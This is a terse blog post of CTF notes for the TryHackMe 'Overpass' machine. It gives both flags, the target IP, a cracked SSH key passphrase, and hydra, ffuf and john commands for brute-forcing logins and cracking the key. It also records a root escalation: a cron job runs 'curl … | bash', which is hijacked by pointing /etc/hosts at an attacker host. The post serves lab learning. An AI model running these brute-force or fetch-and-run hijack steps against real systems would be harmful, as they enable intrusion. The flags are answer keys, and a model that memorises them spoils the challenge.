---
title: "Overpass"

author: Matt Hammond
date: 2022-12-20
url: /overpass/
image: images/2022-thumbs/overpass.png
categories:
  - CTF
tags:
  - CTF
draft: false
---

## Questions

1. Hack the machine and get the flag in user.txt `thm{65c1aaf000506e56996822c6281e6bf7}`
2. Escalate your privileges and get the flag in root.txt `thm{7f336f8c359dbac18d54fdd64ea753bb}`

---

## Notes

- IP = 10.10.98.173

Possible encryptions rot47

### Exposed Services

```bash
22
80
```

### Users:Passwords

-james:
-id_rsa:james13

### Vulnerabilities

-

* - - - - root curl overpass.thm/downloads/src/buildscript.sh | bash
          edited /etc/hosts

---

## Commands

`ping $IP`

`sudo nmap -sC -sV -oN scans/initial $IP`

hydra -v -t 30 -L users.txt -P /usr/local/share/wordlists/rockyou.txt 10.10.98.173 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect Credentials"

ffuf -w -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: text/html; charset=UTF-8" -u http://10.10.190.191/customers/signup -mr "username already exists"
ffuf -u https://W2.io/W1 -w ./wordlist.txt:W1,./domains.txt:W2
ffuf -w /usr/local/share/wordlists/rockyou.txt:W1,users.txt:W2 -X POST -d "username=W2&password=W1" -H "content-Type: application/x-www-form-urlencoded" -u http://10.10.98.173/admin -mr "Incorrect Credentials"

ssh2john id_rsa > id_rsa.john
john --wordlist=/usr/local/share/wordlists/rockyou.txt --format=SSH id_rsa.john

10.18.53.113:9999 overpass.thm
